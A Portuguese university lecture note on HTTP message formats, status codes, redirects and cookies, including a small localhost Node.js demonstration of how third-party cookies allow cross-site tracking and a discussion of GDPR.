# Aula 14 - Protocolo HTTP e *Cookies*

Na aula anterior, discutimos como funciona a autenticação - especialmente a baseada em *passwords* - em sistemas informáticos. Na próxima aula, veremos como implementar um sistema de autenticação em aplicações web. Nesta aula, faremos uma revisão do protocolo HTTP e estudaremos o conceito de *cookies*, o que dará base às discussões da aula seguinte.

## Revisão do HTTP

O HTTP (*HyperText Transfer Protocol*) é o protocolo que dá suporte à aplicação *web* na Internet atual. Aplicações *web* são sistemas de informação acessíveis através de *web browsers* nos quais **recursos** (*e.g.*, documentos, vídeos, áudios, imagens) podem ser interligados através de *hyperlinks* - *i.e.*, um documento pode conter ligações para outros documentos ou recursos. Tipicamente, estes documentos são escritos na linguagem HTML (*Hypertext Markup Language*), mas o HTTP suporta a transferência de quaisquer tipos de dados. 

As aplicações *web*, portanto, são formadas por conjuntos de recursos combinados segundo uma determinada estrutura criada para facilitar o acesso pelo utilizador. Da perspetiva da Segurança Informática, aplicações podem impor restrições quanto ao acesso a determinados recursos (por exemplo, apenas determinados utilizadores têm permissão para aceder a certos recursos) ou podem conter personalizações destes recursos (por exemplo, numa aplicação do tipo *webmail*, cada utilizador tem acesso à sua própria caixa de entrada). Neste sentido, tais aplicações necessitam de mecanismos de autenticação para confirmar a identidade do utilizador e, com isto, dar acesso aos recursos adequados.

### Histórico 

O conceito de *web* e o protocolo HTTP foram criados por Tim Berners-Lee, à época um cientista que trabalhava no CERN. O CERN é uma organização que opera o maior acelerador de partículas do mundo, um ambiente que gera grandes quantidades de dados que precisam ser distribuídos e acessados por investigadores espalhados por todo o mundo. Motivado por este problema - como organizar e disponibilizar estes dados para facilitar o acesso -, Tim Berners-Lee criou o conceito de *web*, desenvolveu as primeiras versões do protocolo HTTP e participou da implementação do primeiro *web browser* e do primeiro servidor HTTP.

Em 1991, o CERN disponibilizou a outras instituições a tecnologia *web*. Em 1993, o CERN tornou públicos (e livres de *royalty*) a especificação e suas implementações dos protocolos. Isto fez com que a *web* rapidamente se tornasse popular, ganhando milhares de páginas e implementações alternativas em pouco tempo. 

Por sua vez, o protocolo HTTP evoluiu através de diversas versões (*e.g.*, 0.9, 1.0, 1.1, 2, 3) que gradualmente trouxeram avanços, particularmente relacionados è eficiência do protocolo na transferência dos dados. A evolução do HTTP foi inicialmente coordenada por uma entidade chamada W3C (*World Wide Web Consortium*), fundada pelo próprio Tim Berners-Lee em 1994. Atualmente, o W3C é responsável pelo desenvolvimento de outras tecnologias associadas à *web* (*e.g.*, as linguagens HTML e CSS), enquanto a coordenação do desenvolvimento do HTTP fica a cargo da IETF (*Internet Engineering Task Force*).

Hoje, a *web* é a principal aplicação da Internet, tornando-se uma tecnologia de convergência e inclusive absorvendo/integrando outras aplicações que anteriormente eram consideradas serviços separados (*e.g.*, acesso a caixas de e-mail, *streaming* de vídeo, aplicações de *chat*).

###  Características do Protocolo

O HTTP é um protocolo baseado em **mensagens texto**. Isto significa que os *headers* e outros metadados incluídos nas mensagens HTTP são representados através de *strings* de caracteres ASCII. O *payload* das mensagens, no entanto, pode ser textual ou binário. É importante referir que, a partir da versão 2, o HTTP passou a suportar um método de compressão dos *headers* para reduzir o *overhead* de controlo do protocolo. Esta compressão acaba por tornar a representação final dos *headers*, como transmitida pela rede, binária -- embora a representação original dos *headers* ainda seja ASCII.

Outra característica importante do HTTP é que se trata de um protocolo **cliente-servidor**. Em um uso típico do HTTP, o cliente é um *web browser*, que estabelece uma ligação com o servidor *web* e realiza **requisições**. O servidor, por sua vez, gera **respostas** que contêm os dados/documentos solicitados pelo cliente -- ou mensagens de erro, caso algum problema ocorra. Por omissão, o HTTP corre no porto 80 do lado do servidor. Alternativamente, pode-se utilizar o **HTTPS, a versão segura do HTTP**, que, entre outras diferenças menores, corre sobre o **TLS** e utiliza o porto 443.

Até a versão 2 (inclusive), o HTTP utilizava TCP como seu protocolo de transporte. A partir da versão 3, publicada em 2022, o HTTP passou a adotar um protocolo alternativo denominado QUIC, que, por sua vez, corre sobre UDP. O QUIC é responsável por prover as funcionalidades de transmissão fiável de dados, controlo de fluxo e controlo de congestionamento, como o TCP, porém emprega alguns outros mecanismos e funcionalidades adicionais, como a multiplexação de vários fluxos de comunicação em paralelo e um *handshake* único que estabelece a ligação e as chaves necessárias ao TLS.

Outra característica importante é que o protocolo **HTTPS é *stateless***. Isto significa que, do ponto de vista do protocolo, cada requisição é tratada pelo servidor de maneira totalmente independente das requisições anteriormente recebidas. Em outras palavras: uma determinada requisição será processada pelo servidor exatamente da mesma forma, independentemente de quantas ou quais requisições foram processadas anteriormente. 

Embora um protocolo *stateless* fosse perfeitamente adequado aos objetivos iniciais do HTTP, que incluiam apenas o acesso a páginas estáticas, isto passa a ser um fator limitante às aplicações *web* modernas. Considere, por exemplo, o problema que estamos a estudar neste ponto da disciplina: uma aplicação realiza um processo de autenticação do utilizador e, a partir disto, a depender da identidade do mesmo, autoriza acesso apenas a um subconjunto dos seus recursos. Digamos que o processo de autenticação (envio de credenciais, validação e resposta pela aplicação) seja feito através de um par de requisição e resposta HTTP. Se o HTTP é *stateless* e, portanto, não armazena o estado com a informação de que a autenticação foi bem-sucedida, como a aplicação pode "recordar" nas requisições posteriores quem é o utilizador para aplicar as políticas de acesso corretas? 

Felizmente, embora o HTTP em si seja *stateless*, ele permite que cliente e servidor manipulem seus ***headers* incluindo metadados** que podem ser usados para o estabelecimento de uma **sessão**, o que **permite à aplicação** que corre sobre o HTTP identificar requisições originadas de um mesmo cliente/contexto. Detalharemos esta abordagem mais à frente nesta aula e em aulas futuras.

### Mensagens HTTP

O protocolo HTTP prevê apenas dois tipos de mensagem: requisição (ou pedido) e resposta. No entanto, o protocolo prevê vários tipos diferentes de requisição (e vários tipos diferentes de resposta).

Em grande parte, os tipos de requisição previstos pelo HTTP referem-se a operações para suporte do uso da *web* originalmente vislumbrado por Tim Berners-Lee. Trata-se de requisições que servem para obter o conteúdo de um determinado recurso, obter metadados sobre um determinado recurso, enviar dados para um determinado recurso, fazer *upload* de um novo recurso para o servidor, remover um determinado recurso do servidor, etc.

Para os propósitos desta UC, os principais tipos de requisição HTTP são:

- `GET`: solicita que o servidor envie o conteúdo/representação de um determinado recurso. Pode ser usado, por exemplo, para obter um ficheiro localizado no servidor. O `GET` é o método HTTP mais comummente utilizado.
- `HEAD`: solicita que o servidor envie apenas os metadados relacionados a um determinado recurso. O `HEAD` é similar ao `GET`, porém o servidor não envia o conteúdo do recurso em si, apenas os *headers* que seriam enviados como parte da resposta.
- `POST`: envia dados do cliente para um determinado recurso no servidor. Um uso típico é o envio de informações de um formulário preenchido pelo utilizador de volta para a aplicação *web* no servidor.

Para além destes, outros métodos comuns são o PUT, DELETE, TRACE e OPTIONS. 

#### Formato de um Pedido

Um exemplo simples de pedido HTTP pode ser visto abaixo:

```http
GET /cidade HTTP/1.1
User-Agent: curl/7.16.3 libcurl/7.16.3
Host: www.lisboa.pt
Accept-Language: pt, en

```

Como discutido anteriormente, uma mensagem HTTP tem formato texto codificado em ASCII. As informações da mensagem são organizadas em linhas, sendo que o HTTP especifica que a quebra de linha deve utilizar os caracteres `\r\n` (*carriage return* e *line feed*).

A primeira linha de uma requisição HTTP é denominada ***request line***. Ela especifica as informações básicas do pedido, nomeadamente o método solicitado (no exemplo, um `GET`), o recurso solicitado (`/cidade`) e a versão do HTTP que o cliente deseja utilizar (versão 1.1). Cada uma destas componentes é separada por exatamente um espaço. Note, ainda, que o recurso é identificado por um **caminho** no servidor. Para páginas estáticas, este caminho corresponde a uma estrutura de diretorias no sistema de ficheiros do servidor, sendo as diretorias, sub-diretorias e nomes de ficheiros separados pelo carácter '/'.

Após a *request line*, a requisição contém um número variável de ***request header fields***. Cada *request header field* consiste em uma linha composta por um nome do *header*, um dois-pontos, um espaço e um valor. Por exemplo, na requisição mostrada acima, o primeiro *request header field* é o `User-Agent: curl/7.16.3 libcurl/7.16.3`. Nele, o nome do *header* é `User-Agent` e o valor especificado é `curl/7.16.3 libcurl/7.16.3`. 

Os *header fields* correspondem a metadados da mensagem HTTP e têm por objetivo prover informações adicionais que sejam úteis para que as aplicações (servidor e cliente) saibam detalhes de como devem processar ou interpretar o conteúdo da mensagem. Existem diversos *header fields* que são padronizados, mas o HTTP não impede que aplicações eventualmente definam e utilizem seus próprios *header fields* não-padrão. 

O HTTP também, em geral, não obriga a inclusão de *header fields* nas requisições. Uma exceção é o *header field* `Host`, que especifica o *hostname* da URI do recurso solicitado e é obrigatório no HTTP/1.1.

Após as linhas dos *header fields*, é obrigatória a existência de uma linha em branco. Ou seja, o último *header field* é seguido de duas quebras de linha (`\r\n\r\n`). Esta linha em branco tem por objetivo separar os *headers* do **corpo da mensagem**. O corpo da mensagem é a zona responsável por transportar o *payload*, embora muitas vezes este seja vazio. Isto é particularmente comum para requisições do tipo `GET`, onde o objetivo é solicitar algo do servidor, ao invés de enviar-lhe algo. Por outro lado, requisições do tipo `POST` têm como semântica justamente enviar informações a algum recurso do servidor e, portanto, frequentemente têm um corpo não vazio.

#### Formato de uma Resposta

Uma resposta HTTP tem um formato análogo ao dos pedidos: a mensagem é dividida em quatro zonas: a *status line*, os *headers*, uma linha em branco e o corpo. Um exemplo de resposta:

```http
HTTP/1.1 200 OK
Date: Mon, 27 Jul 2009 ...
Server: Apache
Last-Modified: Wed, 22 Jul 2009 ...
Content-Type: text/plain

Hello World!
```

A *status line* é o elemento análogo da *request line* para as mensagens de resposta. Ela fornece as informações básicas sobre a resposta, nomeadamente a versão do HTTP utilizada pelo servidor nesta resposta, um **código de *status*** e uma *reason phrase*. 

O código de *status* é um código numérico padronizado que determina se a requisição foi bem sucedida ou, em caso negativo, fornece informações sobre o erro e/ou sobre como o cliente deve proceder. Códigos de *status* previstos pelo HTTP são separados em gamas, de forma que cada gama corresponda a um tipo de *status*. Mais especificamente:

- `1XX` - códigos desta gama indicam que a resposta irá fornecer alguma **informação** potencialmente útil ao cliente. Por exemplo, uma resposta com código `100` significa que o servidor recebeu uma requisição parcial que não foi rejeitada e solicita ao cliente que proceda ao envio do restante da mensagem.
- `2XX` - esta gama denota respostas de **sucesso**. O exemplo mais comum é o código `200` que indica que a requisição foi bem sucedida e que a resposta corresponde ao que quer que tenha sido solicitado pelo cliente na requisição. Há, no entanto, uma série de outros códigos de *status* de sucesso previstos pelo HTTP, como o `202` que indica que o servidor aceitou a requisição, mas que o processamento relativo a ela ainda não terminou. Em geral, o código `202` é utilizado no caso de tarefas que demandam algum tempo de processamento e exige que o cliente solicite o conteúdo final da requisição original mais tarde.
- `3XX` - corresponde a códigos relativos a **redireções**. O caso mais comum ocorre quando o cliente requisita um determinado recurso que, por qualquer motivo, não se encontra disponível no caminho especificado no pedido. Um código que nos será particularmente importante no restante desta disciplina é o código `302`, que indica ao cliente que aquele recurso está **temporariamente** localizado em outra URI. Neste caso, a mensagem de resposta deve, adicionalmente, conter a nova URI para que o cliente possa proceder com o acesso ao recurso.
- `4XX` - contém códigos de *status* que indicam **erros** **provavelmente causados pelo cliente**. O mais comum é o erro `404`, que indica que o servidor não conseguiu localizar o recurso solicitado pelo cliente. O erro `403` também é relativamente comum, e indica que o cliente não tem autorização para aceder ao recurso solicitado.
- `5XX` - assim como a gama `4XX`, indica que algum **erro** ocorreu, mas, neste caso, trata-se de alguma situação **causada pelo servidor**. Um exemplo é o *status* `500`, que indica que o servidor encontrou alguma falha interna ao processar a requisição. Muitas vezes, esta falha indica um erro no código da aplicação que corre no servidor (*e.g.*, uma exceção não tratada pelo código).

Os códigos de *status* em geral são associados a uma *reason phrase*, *i.e.*, uma pequena string que descreve textualmente o significado do código. Por exemplo, o código `200` tem como *reason phrase* simplesmente `OK`; o código `404` tem a *reason phrase* `NOT FOUND`. Esta *reason phrase* é opcionalmente (mas frequentemente) incluída ao final da *status line* da resposta.

Após a *status line*, uma resposta HTTP contém um número variável de *response header fields*, análogos aos *request header fields*. A sintaxe e semântica é idêntica a dos *headers* da requisição, embora haja tipos de *headers* específicos para as requisições e outros específicos para as respostas.

Após a linha em branco que identifica o final dos *headers*, a última zona da resposta é o corpo da mensagem. O conteúdo deste corpo depende da requisição que foi realizada e do *status* da resposta. Para uma requisição `GET` bem sucedida, por exemplo, o corpo conterá o conteúdo/representação do recurso solicitado.

#### Exemplos de *Headers*

Como discutido anteriormente, há um conjunto relativamente extenso de *headers* padronizados no HTTP, além de o protocolo permitir o uso de *headers* não padrão. Portanto, o universo de *headers* encontrados em mensagens HTTP na Internet é bastante grande. No entanto, há um conjunto de *headers* que são particularmente comuns.

Um exemplo é o *header* `User-Agent`, comummente presente em requisições. O valor deste *header* identifica a aplicação que gerou aquela requisição. Esta identificação normalmente inclui um número de versão. Por exemplo: `curl/7.16.3 libcurl/7.16.3`. Aqui, o cliente é a aplicação *curl* (um utilitário de linha de comando para realizar transferência de dados de/para servidores) na versão 7.16.3 que utiliza uma biblioteca chamada *libcurl* versão 7.16.3. O termo *User Agent* é frequentemente utilizado para denotar o *software* cliente, conforme veremos em aulas posteriores.

Um segundo *header* bastante comum (e, em alguns casos, obrigatório) é o *Host*, que indica o *hostname* do servidor. Este *header* é importante porque servidores físicos com um único endereço IP muitas vezes servem diversas aplicações ou sites diferentes, identificados por nomes diferentes. Quando uma requisição HTTP chega ao servidor, ele precisa de alguma informação que permita distinguir para qual aplicação/site aquela requisição é direcionada.

O *header* `Accept-Language` é usado pelo cliente para informar o servidor sobre uma ou mais linguas **esperadas** para o conteúdo retornado. Por exemplo, o valor `pt, en` indica que o cliente espera uma resposta em Português (preferencialmente) ou Inglês. O servidor não é obrigado a respeitar as linguas especificadas pelo cliente, mas determinadas aplicações podem ler o valor deste *header* e retornar versões adequadas do conteúdo ao cliente.

Finalmente, o *header* `Content-Type` é usado tanto em requisições quanto em respostas. Em ambos os casos, seu valor informa qual é o tipo do conteúdo incluído no corpo da mensagem. Por exemplo, um valor `application/json` indica que o dado transportado no corpo da mensagem corresponde a um documento no formato JSON. O valor deve denotar um **MIME type** (mais recentemente denominado ***Media Type***): MIME types são padronizados e podem ser consultados em referências adequadas (*e.g.*, https://www.iana.org/assignments/media-types/media-types.xhtml).


### Resposta *Redirect*

Como explicado anteriormente, a resposta de um servidor a uma requisição pode ter um código de *status* na gama `3XX`, indicando algum tipo de redireção. Ou seja, o servidor indica ao cliente que ele deve realizar uma nova requisição para um outro endereço para obter o recurso desejado. Para informar o novo endereço do recurso ao cliente, o servidor inclui na sua resposta um *header* específico chamado `Location`.

Considere o seguinte exemplo. O cliente gera a seguinte requisição original:

```http
GET /doc HTTP/1.1
User-Agent: curl/7.16.3 libcurl/7.16.3
Host: www.isel.pt
Accept-Language: pt, en

```

Note que o recurso requisitado é identificado pelo caminho `/cidade`. Agora considere a seguinte resposta do servidor:

```http
HTTP/1.1 301 Moved Permanently
Server: Apache
Location: /new_doc

```

Um *browser*, ao receber uma resposta como esta, automaticamente realiza um novo pedido ao servidor utilizando agora o caminho sugerido no *header* `Location`:

```http
GET /new_doc HTTP/1.1
User-Agent: curl/7.16.3 libcurl/7.16.3
Host: www.isel.pt
Accept-Language: pt, en

```

Espera-se que esta nova requisição seja bem-sucedida:

```http
HTTP/1.1 200 OK
Server: Apache
...
```

Na próxima aula, veremos como este mecanismo de redireção é frequentemente utilizado por aplicações *web* para propósitos de autenticação dos utilizadores.

## *Cookies*

Como referido no início desta aula, uma das características de maior destaque do HTTP é tratar-se de um protocolo *stateless*. Isto é inconveniente da perspetiva de boa parte das aplicações *web* porque, a princípio, parece impedir que a aplicação relacione os vários pedidos realizados por um mesmo utilizador. Por exemplo, como a aplicação sabe que o utilizador já foi devidamente autenticado, ao receber uma requisição por um recurso de acesso privilegiado, se não se armazena estado das requisições?

Embora o HTTP em si seja *stateless*, o facto de este utilizar os *headers* e expô-los às aplicações cliente e servidor permite o estabelecimento de **sessões**. A ideia é simples: o servidor atribui **identificadores** únicos a cada sessão, os informa para os respetivos clientes (através de um *header* de uma resposta) que, por sua vez, comprometem-se a incluí-los em um *header* apropriado nas suas requisições posteriores. Desta forma, quando, no futuro, o servidor receber uma requisição relativa a uma determina sessão, basta que este consulte o valor do *header* para obter o identificador da sessão. Ao mesmo tempo, o servidor pode usar este identificador como um índice para uma base de dados de sessões ativas, na qual são armazenadas informações de estado de cada sessão.

Na prática, ao invés de utilizar *headers* específicos para este único propósito - identificação de sessões -, aplicações *web* valem-se de um mecanismo similar porém um pouco mais geral denominado de ***Cookies***.


### O Que São *Cookies*?

No contexto do HTTP, um *cookie* é um **pedaço de informação** que o servidor solicita ao **cliente que armazene** em seu nome. Uma mesma página/aplicação pode solicitar ao *browser* que armazene um número arbitrário de *cookies*. Além disto, quando um *browser* armazena um *cookie* de uma página/aplicação, ele compromete-se a incluí-los em todas as requisições futuras àquela página. Assim, embora o HTTP em si seja *stateless*, os *cookies* permitem que o cliente armazene estado em nome do servidor.

Mais detalhadamente, um *cookie* corresponde a um par `nome=valor`. O servidor pode solicitar ao cliente o armazenamento de um ou mais *cookies* em qualquer mensagem de resposta. Para isto, o servidor inclui nesta resposta um ou mais *header fields* denominados `Set-Cookie` - um `Set-Cookie` é usado para cada *cookie* que o servidor deseja criar. O valor deste *header field* é a especificação do nome e valor do Cookie (além de, possivelmente, alguns propriedades que veremos a seguir). Por exemplo:

```http
HTTP/1.1 200 OK
Server: Apache
Content-Type: text/plain
Set-Cookie: session_id=12345678
Set-Cookie: app_version=2.1
...
```

Na resposta HTTP acima, o servidor solicita ao cliente o armazenamento de dois *cookies*: um chamado `session_id` com valor 12345678 e outro denominado `app_version` com valor 2.1. Ao receber esta resposta, o cliente deverá armazenar os *cookies* solicitados localmente (num ficheiro ou base de dados) e deverá incluí-los nas requisições posteriores àquele site/aplicação. Esta inclusão é feita através do *header field* `Cookie`. Por exemplo:

```http
GET /new_doc HTTP/1.1
User-Agent: curl/7.16.3 libcurl/7.16.3
Host: www.isel.pt
Accept-Language: pt, en
Cookie: session_id=12345678; app_version=2.1
...
```

Note que, ao contrário do que ocorre com o `Set-Cookie`, o *header field* `Cookie` permite a especificação de múltiplos *cookies* de uma só vez. Adicionalmente, note que a qualquer altura o servidor pode atualizar o valor de um *cookie* junto ao cliente simplesmente informando o novo valor num *header field* `Set-Cookie` em alguma mensagem de resposta. A sintaxe neste caso é exatamente a mesma usada na criação do *cookie*.

> [!NOTE]
>
> Ilustração de interação entre cliente e servidor que envolve a criação e envio de *cookies*.
>
> Podemos visualizar esta dinâmica da utilização de *cookies* entre cliente e servidor facilmente através de um *browser* como o Firefox. Para tanto, utilizaremos como exemplo a página da plataforma Moodle do ISEL:
> - Começamos por instanciar uma janela anónima no Firefox. O que isto faz é criar uma instância do *browser* que não possui quaisquer *cookies* armazenados.
> - De seguida, carregamos o *Web Development Tools* (`Menu Principal > More Tools > Web Development Tools).
> - Na janela do *Web Development Tools*, selecionamos a aba `Network`. Esta aba mostra uma lista das requisições realizadas pelo *browser* para a página atualmente carregada.
> - Agora, acedemos ao endereço https://2425moodle.isel.pt/. Uma lista relativamente extensa de requisições deve ser exibida no *Web Development Tools*.
> - Se selecionarmos a primeira requisição da lista, podemos ver detalhes, como a lista de *request headers* incluídos na requisição e a respetiva resposta. Esta primeira requisição deve ser para o recurso `/` (indicado na coluna `File`).
>   - Observe no quadro de detalhes à direita os *Request Headers*. Note, em particular, a ausência de um *request header* denominado `Cookie`. 
>   - Isto ocorre porque a instância do *browser* que estamos a utilizar -- em modo anónimo -- ainda não havia acedido a esta página e, portanto, não possuia *cookies* relativos a mesma.
>   - Observer agora, no mesmo quadro, os *Response Headers*. Trata-se dos *response headers* encontrados na resposta enviada pelo servidor. Particularmente, deve haver um *header field* denominado `Set-Cookie`.
>   - Para esta página, o servidor deve, de momento, solicitar a geração de um único *cookie* denominado `MoodleSession`. Como veremos em mais detalhes a seguir, o valor deste *cookie* contém um identificador de sessão, que deve ser único para o nosso *browser*.
>   - Selecione, agora, a segunda requisição da lista feita para o mesmo servidor `2425moodle.isel.pt` e analise os *Request Headers*.
>   - Note como agora o cliente incluiu um *header field* denominado `Cookie` que envia o valor do *cookie* `MoodleSession`.
>   - Repare agora nos *Response Headers*: não há desta vez um *header* `Set-Cookie` porque o servidor reconhece que o *cookie* necessário já foi criado anteriormente.
>   - Por fim, recarregue a página, selecione novamente a primeira requisição e observe os *Request Headers* e *Response Headers*: agora, por ser um novo acesso à página, o cliente já possui o *cookie* definido anteriormente pelo servidor e, portanto, o inclui na requisição; pelo seu lado, o servidor não necessita de definir o *cookie* novamente e, portanto, não há header `Set-Cookie` na resposta. 

É importante citar que *cookies* têm uma série de propriedades. Por exemplo, *cookies* podem ter uma data de expiração: quando criados (*i.e.*, quando o servidor solicita ao cliente que os armazene), o servidor pode especificar que o *cookie* só é válido até determinada data ou durante um determinado tempo; após este tempo/data, o *cookie* deve removido pelo *browser* e, portanto, deve deixar de ser enviado ao servidor nas requisições subsequentes. Isto é feito através das propriedades `Expires` ou `Max-Age`. Por exemplo:

```http
HTTP/1.1 200 OK
Server: Apache
Content-Type: text/plain
Set-Cookie: session_id=12345678; Expires=Thu, 12 Sep 2024 07:28:00 GMT
...
```

Quando uma validade não é especificada, os *cookies* são considerados válidos pelo *browser* apenas durante a sessão corrente - a definição de *sessão* varia de *browser* para *browser*.

Outras propriedades importantes de um *cookie* são a `Domain` e a `Path`. Estas propriedades permitem ao servidor controlar em quais requisições o cliente irá incluir o *cookie*. Se o servidor não especifica estas propriedades, por omissão o cliente incluirá o *cookie* em todas as requisições feitas para **qualquer página do mesmo domínio, mas não para subdomínios**. Por exemplo, se um site `company.com` solicita ao *browser* a criação de um *cookie* sem especificar `Domain` ou `Path`, o *cookie* será incluído em requisições para `company.com/docs`, `company.com/shared/files`, mas não para `it.company.com/about`.

Por outro lado, se o mesmo servidor especifica um domínio na propriedade `Domain` do *cookie*, então o *browser* deverá incluir este *cookie* nas requisições para páginas daquele domínio ou de qualquer subdomínio nele contido. No exemplo anterior, se o *cookie* é criado com `Domain=company.com`, então ele seria incluído numa requisição para `it.company.com/about`.

Já a propriedade `Path` permite ao servidor limitar a inclusão do *cookie* em requisições a páginas cujo caminho contenha um prefixo específico. Por exemplo, se `Path=/docs`, requisições a recursos como `company.com/docs` e `company.com/docs/report` incluirão o *cookie*, mas requisições a `company.com/shared/files` não.

### Usos de *Cookies*

O uso mais habitual dos *cookies* é para o estabelecimento sessões entre o cliente e o servidor. Mas isto permite também algumas funcionalidades adicionais, como a de "permanecer autenticado" com uma aplicação. Se o cliente estabelece uma sessão com o servidor e durante a mesma efetua uma autenticação bem-sucedida, o servidor passa a associar aquela sessão a uma comunicação autenticada. Se dias depois o *browser* estabelece uma nova ligação com o servidor, mas envia os *cookies* corretos relacionados àquela sessão, o servidor ainda reconhece o utilizador como autenticado e não solicita um novo processo de autenticação.

*Cookies* também podem ser usados para que um servidor registe preferências do cliente (e.g., a lingua do conteúdo, opções de interface). Tais informações podem ser armazenadas diretamente num *cookie* ou numa base de dados no servidor indexada pelo valor do *cookie*.

#### Third-Party Cookies

Um outro uso importante, embora polémico, dos *cookies* na Internet é para o registo ou rastreio de navegação do utilizador. Isto envolve os chamados ***Third-Party Cookies***. Trata-se de *cookies* que são criados/atualizados quando o *browser* acede um site, mas que pertencem a outro domínio não relacionado ao site. 

Suponha um site hipotético chamado `http://siteA.site/`. Imagine que a página principal deste site faz referência a algum objeto (*e.g.*, uma imagem, um *script* javascript ou um *iframe*) localizado em outro domínio denominado `someCompany.site`. Quando o *browser* recebe a página HTML base de `http://siteA.site/`, ele começa o processo de *parsing* e eventualmente encontra a referência a este objeto. Para concluir o carregamento da página, portanto, o *browser* realiza uma requisição HTTP ao objeto em questão para o servidor relativo ao domínio `someCompany.site`. Na resposta a esta requisição, o servidor de `someCompany.site` pode solicitar a criação/atualização de um ou mais *cookies* que estarão associados ao domínio `someCompany.site`, embora a página que originalmente desejávamos acessar seja do domínio `siteA.site`.

Mas por qual razão o servidor de `someCompany.site` iria querer criar *cookies* relativos a este acesso? Na prática, existem diversos possíveis objetivos. Por exemplo, isto pode ser utilizado em algumas soluções de autenticação por uma terceira parte: ao invés de realizar o próprio processo de autenticação, o site `siteA.site` pode delegar isto para um serviço de autenticação de `someCompany.site` que pode necessitar de *cookies* para funcionar.

Outra possível razão é para que a *company B* possa realizar um rastreio dos sites/conteúdos acessados pelo utilizador. Suponha, por exemplo, que a *company B*, de alguma forma, convença os sites `http://siteA.site`, `http://siteB.site` e `http://siteC.site` a incluírem em suas páginas uma referência a uma URL `http://someCompany.site/tracking?source=siteX`, onde X é A, B ou C, respetivamente, para cada um dos três sites. Toda vez que um utilizador acede a um destes sites, seu *browser* faz requisições ao servidor de `someCompany.site` para obter o recurso referenciado por aquela URL. Na primeira requisição, o servidor de `someCompany.site` irá solicitar ao *browser* a criação de um *cookie* com um identificador. Nos acessos seguintes a qualquer um dos sites, este *cookie* será enviado de volta ao servidor `someCompany.site` contendo o identificador. Note que como a URL acessada faz referência ao site que originou a requisição, o servidor de `someCompany.site` será capaz de identificar o conjunto de sites que aquele mesmo utilizador acessou ao longo do tempo. 


> [!NOTE]
> Ilustração de um cenário de uso de *third-party cookies* para *tracking* de utilizadores.
>
> Podemos ilustrar o processo de *tracking* descrito nos parágrafos anteriores de maneira mais concreta através de três pequenos servidores escritos em *nodejs*.
>
> O primeiro servidor, que representará o servidor da *Company B*, tem a seguinte estrutura:
> ```node
> const express = require("express");
> var cors = require('cors')
> const cookieParser = require('cookie-parser');
> 
> const PORT = 8082;
> const app = express();
> 
> var sessions = {};
> var nextSession = 0;
> 
> app.use(cors())
> app.use(cookieParser());
> 
> app.get("/banner", function (req, res) {
> 
>     if (req.cookies.session in sessions) {
> 
>         sessions[req.cookies.session] += ";" + req.query.source;
>         console.log("User associated with session " + req.cookies.session + " accessed the following sites: " + sessions[req.cookies.session]);
>     }
>     else {
> 
>         sessions[nextSession] = req.query.source;
>         console.log("User associated with session " + nextSession + " accessed the following sites: " + sessions[nextSession]);
>         res.cookie("session", nextSession);
>         nextSession++;
>     }
>     
>     res.send("");
> });
> 
> app.listen(PORT, () => {
> 
>     console.log(`Example app listening on port ${PORT}`)
> })
> ```
>
> Este servidor utiliza o módulo `cookie-parser` para extrair os *cookies* das requisições recebidas. Isto é feito pelo método `cookieParser()` utilizado como um *middleware* para todas as requisições. Este método adiciona a propriedade `cookies` ao objeto da requisição, que corresponde a um objeto com propriedades correspondentes a cada *cookie* encontrado. 
>
> Neste exemplo hipotético, o servidor disponibiliza um único recurso denominado `/banner`. Hipoteticamente, a *Company B* pode oferecer um serviço de anúncios, e este recurso devolveria como resposta uma imagem a ser exibida para o utilizador com algum tipo de propaganda. 
>
> A *callback* que processa as requisições `GET` a este recurso começa por verificar se há um *cookie* denominado `session` na requisição recebida. Se não há, este *browser*, a princípio, nunca havia feito uma requisição a este servidor no passado. Neste caso, atribuímos um novo número de sessão ao *browser*, solicitamos a criação de um *cookie* `session` através da resposta e armazenamos o valor do parâmetro `source` recebido na requisição na entrada correspondente a esta nova sessão no objeto `sessions`. Se, por outro lado, a requisição já contém o *cookie* `sessions`, trata-se de um *browser* que já realizou um acesso a este servidor no passado. Neste caso, recuperamos a informação desta sessão no objeto `sessions` e concatenamos a ela o valor do parâmetro `source` recebido na requisição. Em ambos os casos, o servidor imprime na consola a informação (atualizada) de sessão -- ou seja, os sites visitados por aquele *browser*.
>
> Os outros dois servidores são mais simples. Por exemplo, para o servidor do `siteA`, podemos ter o seguinte código:
>
> ```node
> const express = require("express");
> 
> const PORT = 8080;
> const app = express();
> 
> app.get("/", function (req, res) {
>     
>     res.send("<html><body><h1>Page for siteA!</h1><img src='http://localhost:8082/banner?source=siteA'/></body></html>");
> });
> 
> app.listen(PORT, () => {
> 
>     console.log(`Example app listening on port ${PORT}`)
> })
> ```
>
> Neste exemplo hipotético, o servidor simplesmente apresenta uma página HTML simples que contém uma imagem que faz referência à URL do recurso `/banner` no servidor da *Company B* -- aqui, por simplicidade, usamos o endereço `localhost:8082`. Repare como esta URL contém um parâmetro `source` cujo valor é `siteA`. O `siteB` é idêntico, exceto por incluir o valor `siteB` para este parâmetro.
>
> Se corrermos os três servidores simultaneamente e começarmos a fazer acessos aos sites `siteA` e `siteB`, veremos na consola do servidor da *Company B* os registos de quais sites (e em qual ordem) foram acessados. 
> 
> Podemos, posteriormente, repetir o mesmo experimento, mas em uma janela anónima. Neste caso, como esta janela corresponde a uma instância do *browser* sem *cookies* prévios, as requisições ao servidor da *Company B* serão interpretadas como vindas de outro *browser* diferente, ao qual será associado um número de sessão distinto. De toda maneira, o servidor da *Company B* será capaz de diferenciar perfeitamente a ordem de acessos realizados aos sites `siteA` e `siteB` por cada uma das instâncias do *browser*.



Se este processo for realizado com um universo significativo de sites e durante um período longo de tempo, o resultado é que a *company B* conseguirá traçar um perfil detalhado dos interesses do utilizador. Isto poderá ser utilizado futuramente para uma diversidade de fins, incluindo *marketing* direcionado (*i.e.*, apresentar ao utilizador anúncios de produtos/serviços relacionados com o conteúdo das páginas mais frequentemente visitadas). No entanto, isto também é frequentemente considerado um problema de privacidade na Internet, porque uma entidade não relacionada aos sites que o utilizador acessa pode ganhar conhecimento não autorizado sobre esta informação.

Devido aos questionamentos relativos à privacidade, o uso de *cookies* tem sido alvo de repetidas discussões e, mais recentemente, legislações. Por exemplo, a União Europeia considera que Cookies constituem dados pessoais do utilizador e, portanto, estão abrangidos pela GDPR (*General Data Protection Regulation*). Como tal, para que sites que utilizam *cookies* estejam de acordo com a GDPR, eles precisam atender a uma série de exigências. Particularmente, os sites são obrigados a informar o utilizador sobre que tipos de *cookies* são utilizados e para quais fins, solicitando o consentimento antes de defini-los.

### Uso Seguro de *Cookies*

